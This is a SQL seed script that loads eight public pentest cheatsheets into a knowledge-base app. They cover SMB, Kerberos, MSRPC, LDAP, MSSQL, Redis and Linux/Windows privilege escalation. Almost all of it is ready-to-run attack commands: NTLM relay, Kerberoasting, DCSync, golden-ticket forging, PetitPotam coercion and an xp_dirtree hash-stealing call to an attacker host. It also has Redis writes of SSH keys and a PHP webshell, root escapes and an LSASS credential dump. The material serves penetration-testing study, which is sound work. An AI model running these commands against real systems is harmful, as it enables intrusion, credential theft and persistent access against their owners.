-- HackIndex.io Complete Cheatsheets & Commands for Index 389
-- Run this in your Supabase SQL Editor to populate all cheatsheets immediately!

DO $$
DECLARE
  v_author_id text;
BEGIN
  -- Find an author or admin
  SELECT id INTO v_author_id FROM "User" WHERE role = 'ADMIN' OR name = 'Arax0n' LIMIT 1;
  IF v_author_id IS NULL THEN
    SELECT id INTO v_author_id FROM "User" LIMIT 1;
  END IF;

  -- 1. SMB 445
  INSERT INTO "KnowledgeDocument" (id, title, slug, folder, category, content, visibility, "isFavorite", "authorId", "createdAt", "updatedAt")
  VALUES (
    'kd_smb445',
    'SMB — Server Message Block (Pentest Cheatsheet)',
    'cheatsheet-smb-445',
    'Network Ports',
    'Cheatsheet',
    '# SMB — Server Message Block

**Protocol:** `TCP 445 / 139` | **Category:** `Network Ports`

> Critical network file sharing protocol. Prime vector for anonymous null sessions, SMB signing bypass, and EternalBlue/ZeroLogon/Relay attacks.

---

## Reconnaissance

### Nmap SMB Discovery
Detect OS version, domain name, NetBIOS name, and SMB signing requirements.
```bash
nmap -p 139,445 --script smb-os-discovery,smb-security-mode,smb2-security-mode <TARGET>
```

### NetExec SMB Dialect & Signing Probe
Quick probe for SMB signing status to identify relay targets (Signing: False).
```bash
netexec smb <TARGET> --gen-relay-list smb_relay.txt
```

## Enumeration

### Anonymous Null Session Share Dump
List accessible network shares using unauthenticated null session.
```bash
netexec smb <TARGET> -u '''''' -p '''''' --shares
```

### Guest User Share Enumeration
Interactive anonymous SMB client share listing.
```bash
smbclient -N -L //<TARGET>
```

### RPC Client User & Group Dump
Dump Active Directory domain usernames and RID cycling via RPC.
```bash
rpcclient -U "" -N <TARGET> -c "enumdomusers; querydispinfo; enumdomgroups"
```

## Exploitation

### EternalBlue (MS17-010) Verification
Check remote code execution vulnerability in SMBv1 kernel driver.
```bash
nmap -p 445 --script smb-vuln-ms17-010 <TARGET>
```

### SMB Hash Relay via Impacket
Intercept and relay NTLM authentication to execute interactive SOCKS proxy.
```bash
impacket-ntlmrelayx -tf smb_relay.txt -smb2support -socks
```

### PsExec SYSTEM Command Execution
Instantiate remote NT AUTHORITY\SYSTEM service shell over SMB.
```bash
impacket-psexec DOMAIN/user:password@<TARGET>
```
',
    'PUBLIC',
    true,
    v_author_id,
    NOW(),
    NOW()
  )
  ON CONFLICT (slug) DO UPDATE SET
    title = EXCLUDED.title,
    folder = EXCLUDED.folder,
    content = EXCLUDED.content,
    "updatedAt" = NOW();

  -- 2. Kerberos 88
  INSERT INTO "KnowledgeDocument" (id, title, slug, folder, category, content, visibility, "isFavorite", "authorId", "createdAt", "updatedAt")
  VALUES (
    'kd_kerberos88',
    'Kerberos & Active Directory (Pentest Cheatsheet)',
    'cheatsheet-active-directory-kerberos',
    'Active Directory',
    'Cheatsheet',
    '# Kerberos & Active Directory Authentication

**Protocol:** `TCP/UDP 88` | **Category:** `Active Directory`

> Ticket-based domain authentication. Attack vectors include AS-REP Roasting, Kerberoasting, Unconstrained Delegation, and Overpass-the-Hash.

---

## Enumeration

### AS-REP Roasting (No Pre-Auth Users)
Query accounts that do not require Kerberos preauthentication to dump offline crackable TGT hashes.
```bash
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip <DC_IP> -format hashcat -outputfile asreproast.hash
```

### Kerberoasting (SPN Service Accounts)
Request TGS service tickets for service accounts and extract TGS-REP hash for offline cracking.
```bash
impacket-GetUserSPNs domain.local/user:password -dc-ip <DC_IP> -request -outputfile kerberoast.hash
```

## Exploitation

### Crack Hashes with Hashcat
Crack Kerberos TGS-REP service ticket hashes (Hashcat mode 13100) or mode 18200 for AS-REP.
```bash
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt -o cracked.txt
```

### DCSync Domain Credentials Harvest
Replicate Active Directory directory partition using DRSUAPI to harvest all domain user NTLM hashes.
```bash
impacket-secretsdump domain.local/admin:password@<DC_IP> -just-dc-ntlm
```

## Privilege Escalation

### Golden Ticket Generation (KRBTGT)
Forge a Golden Ticket granting permanent Domain Admin rights for 10 years.
```bash
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain domain.local Administrator
```
',
    'PUBLIC',
    true,
    v_author_id,
    NOW(),
    NOW()
  )
  ON CONFLICT (slug) DO UPDATE SET
    title = EXCLUDED.title,
    folder = EXCLUDED.folder,
    content = EXCLUDED.content,
    "updatedAt" = NOW();

  -- 3. MSRPC 135
  INSERT INTO "KnowledgeDocument" (id, title, slug, folder, category, content, visibility, "isFavorite", "authorId", "createdAt", "updatedAt")
  VALUES (
    'kd_msrpc135',
    'MSRPC — Microsoft Endpoint Mapper (Pentest Cheatsheet)',
    'cheatsheet-msrpc-135',
    'Network Ports',
    'Cheatsheet',
    '# MSRPC — Microsoft Endpoint Mapper

**Protocol:** `TCP 135` | **Category:** `Network Ports`

> Microsoft Remote Procedure Call mapper. Used to discover hidden dynamic RPC interfaces and execute RPC attacks.

---

## Reconnaissance

### RPCDump Interface Enumeration
Query RPC Endpoint Mapper to find listening interfaces (WMI, Task Scheduler, Print Spooler).
```bash
impacket-rpcdump -port 135 <TARGET>
```

## Enumeration

### RPCClient Null-Session Enumeration
Interactive session commands: enumdomusers, enumdomgroups, getdompwinfo, queryuser <RID>.
```bash
rpcclient -U "" -N <TARGET>
```

## Exploitation

### PetitPotam (MS-EFSRPC) Coercion
Coerce domain controller machine account NTLM authentication to relay target.
```bash
python3 PetitPotam.py <ATTACKER_IP> <TARGET_DC>
```
',
    'PUBLIC',
    true,
    v_author_id,
    NOW(),
    NOW()
  )
  ON CONFLICT (slug) DO UPDATE SET
    title = EXCLUDED.title,
    folder = EXCLUDED.folder,
    content = EXCLUDED.content,
    "updatedAt" = NOW();

  -- 4. LDAP 389
  INSERT INTO "KnowledgeDocument" (id, title, slug, folder, category, content, visibility, "isFavorite", "authorId", "createdAt", "updatedAt")
  VALUES (
    'kd_ldap389',
    'LDAP / LDAPS — Directory Services (Pentest Cheatsheet)',
    'cheatsheet-ldap-389',
    'Active Directory',
    'Cheatsheet',
    '# LDAP / LDAPS — Directory Services

**Protocol:** `TCP 389 / 636` | **Category:** `Active Directory`

> Lightweight Directory Access Protocol. Critical for domain architecture enumeration, ACL discovery, and BloodHound collection.

---

## Reconnaissance

### LDAP RootDSE Extraction
Retrieve Active Directory naming context and base domain DN without authentication.
```bash
ldapsearch -x -H ldap://<TARGET> -s base namingcontexts
```

## Enumeration

### Anonymous User & Object Query
List all Active Directory users via unauthenticated LDAP bind.
```bash
ldapsearch -x -H ldap://<TARGET> -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName
```

### BloodHound Python Ingestion
Collect all users, groups, computers, ACLs, and sessions for graph-based privilege analysis.
```bash
bloodhound-python -u user -p password -d domain.local -dc dc.domain.local -c All -ns <DC_IP>
```
',
    'PUBLIC',
    true,
    v_author_id,
    NOW(),
    NOW()
  )
  ON CONFLICT (slug) DO UPDATE SET
    title = EXCLUDED.title,
    folder = EXCLUDED.folder,
    content = EXCLUDED.content,
    "updatedAt" = NOW();

  -- 5. MSSQL 1433
  INSERT INTO "KnowledgeDocument" (id, title, slug, folder, category, content, visibility, "isFavorite", "authorId", "createdAt", "updatedAt")
  VALUES (
    'kd_mssql1433',
    'MSSQL — Microsoft SQL Server (Pentest Cheatsheet)',
    'cheatsheet-mssql-1433',
    'Databases',
    'Cheatsheet',
    '# MSSQL — Microsoft SQL Server

**Protocol:** `TCP 1433` | **Category:** `Databases`

> Enterprise relational database. Key vectors: sa password brute-force, xp_cmdshell command execution, linked database traversal, and hash stealing.

---

## Enumeration

### Impacket MSSQLClient Interactive Shell
Connect to database and inspect server configuration, databases, and privileges.
```bash
impacket-mssqlclient DOMAIN/user:password@<TARGET> -windows-auth
```

## Exploitation

### Enable & Execute xp_cmdshell (RCE)
Spawn operating system command shell under MSSQL service account context.
```sql
EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE; EXEC xp_cmdshell ''whoami'';
```

### Steal NetNTLMv2 Hash via xp_dirtree
Force MSSQL server to authenticate to SMB listener and capture hash with Responder.
```sql
EXEC master..xp_dirtree ''\\<ATTACKER_IP>\share'';
```
',
    'PUBLIC',
    true,
    v_author_id,
    NOW(),
    NOW()
  )
  ON CONFLICT (slug) DO UPDATE SET
    title = EXCLUDED.title,
    folder = EXCLUDED.folder,
    content = EXCLUDED.content,
    "updatedAt" = NOW();

  -- 6. Redis 6379
  INSERT INTO "KnowledgeDocument" (id, title, slug, folder, category, content, visibility, "isFavorite", "authorId", "createdAt", "updatedAt")
  VALUES (
    'kd_redis6379',
    'Redis In-Memory Store (Pentest Cheatsheet)',
    'cheatsheet-redis-6379',
    'Databases',
    'Cheatsheet',
    '# Redis In-Memory Key-Value Store

**Protocol:** `TCP 6379` | **Category:** `Databases`

> High-speed cache and database. Frequently unauthenticated. Key vectors: writing SSH authorized_keys to root, cron job injection, and webshell drops.

---

## Reconnaissance

### Probe Unauthenticated Redis Access
Test if Redis server requires authentication and extract server statistics.
```bash
redis-cli -h <TARGET> info
```

## Exploitation

### SSH Key Overwrite for Root Access
Write attacker SSH public key directly into /root/.ssh/authorized_keys.
```bash
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /tmp/key.txt && redis-cli -h <TARGET> -x set ssh_key < /tmp/key.txt && redis-cli -h <TARGET> config set dir /root/.ssh && redis-cli -h <TARGET> config set dbfilename authorized_keys && redis-cli -h <TARGET> save
```

### Webshell Injection via Redis
Drop PHP webshell into web root directory.
```bash
redis-cli -h <TARGET> config set dir /var/www/html && redis-cli -h <TARGET> config set dbfilename shell.php && redis-cli -h <TARGET> set test "<?php system($_GET[''cmd'']); ?>" && redis-cli -h <TARGET> save
```
',
    'PUBLIC',
    true,
    v_author_id,
    NOW(),
    NOW()
  )
  ON CONFLICT (slug) DO UPDATE SET
    title = EXCLUDED.title,
    folder = EXCLUDED.folder,
    content = EXCLUDED.content,
    "updatedAt" = NOW();

  -- 7. Linux PrivEsc
  INSERT INTO "KnowledgeDocument" (id, title, slug, folder, category, content, visibility, "isFavorite", "authorId", "createdAt", "updatedAt")
  VALUES (
    'kd_linuxprivesc',
    'Linux Privilege Escalation Vectors (Pentest Cheatsheet)',
    'cheatsheet-linux-privesc',
    'Linux',
    'Cheatsheet',
    '# Linux Privilege Escalation Vectors

**Protocol:** `Local OS` | **Category:** `Linux`

> Systematic local enumeration, SUID root exploitation, sudoers misconfigurations, kernel exploits, and cron task hijackings.

---

## Reconnaissance

### Kernel & Architecture Triage
Display Linux kernel build, distribution release, and effective UID/GID context.
```bash
uname -a; cat /etc/os-release; id; whoami
```

### Audit Sudo Permissions
Inspect active sudo policies for NOPASSWD binary entries on GTFOBins.
```bash
sudo -l
```

## Enumeration

### Search SUID & SGID Binaries
Locate executables set to run under root privileges.
```bash
find / -perm -u=s -type f 2>/dev/null
```

### Monitor Background Cron Tasks (Pspy)
Snoop on cron jobs and root daemon execution in real time without root permissions.
```bash
./pspy64 -pf -i 1000
```

## Exploitation

### GTFOBins Sudo NOPASSWD Escape
Break out into interactive root shell using find binary.
```bash
sudo /usr/bin/find . -exec /bin/sh \; -quit
```

### Docker Socket Root Breakout
Mount the host root filesystem inside an unconfined container.
```bash
docker run -v /:/host -it alpine chroot /host /bin/bash
```
',
    'PUBLIC',
    true,
    v_author_id,
    NOW(),
    NOW()
  )
  ON CONFLICT (slug) DO UPDATE SET
    title = EXCLUDED.title,
    folder = EXCLUDED.folder,
    content = EXCLUDED.content,
    "updatedAt" = NOW();

  -- 8. Windows PrivEsc
  INSERT INTO "KnowledgeDocument" (id, title, slug, folder, category, content, visibility, "isFavorite", "authorId", "createdAt", "updatedAt")
  VALUES (
    'kd_windowsprivesc',
    'Windows Privilege Escalation & Tokens (Pentest Cheatsheet)',
    'cheatsheet-windows-privesc',
    'Windows',
    'Cheatsheet',
    '# Windows Privilege Escalation & Tokens

**Protocol:** `Local OS` | **Category:** `Windows`

> Privilege escalation through SeImpersonatePrivilege, Juicy/Print/God Potato, unquoted service paths, and credential harvesting.

---

## Reconnaissance

### User Context & Privileges
Verify active user privileges (check for SeImpersonatePrivilege or SeDebugPrivilege).
```cmd
whoami /priv; whoami /groups; net user %USERNAME%
```

## Exploitation

### GodPotato (SeImpersonate Abuse)
Abuse SeImpersonatePrivilege on Windows 10/11 & Server 2019/2022 to spawn SYSTEM.
```cmd
GodPotato.exe -cmd "cmd.exe /c whoami"
```

### Dump LSASS Memory via ProcDump
Memory dump LSASS process to extract cleartext passwords and NTLM hashes offline.
```cmd
procdump.exe -ma lsass.exe lsass.dmp
```
',
    'PUBLIC',
    true,
    v_author_id,
    NOW(),
    NOW()
  )
  ON CONFLICT (slug) DO UPDATE SET
    title = EXCLUDED.title,
    folder = EXCLUDED.folder,
    content = EXCLUDED.content,
    "updatedAt" = NOW();

  RAISE NOTICE 'All HackIndex Cheatsheets populated successfully!';
END $$;
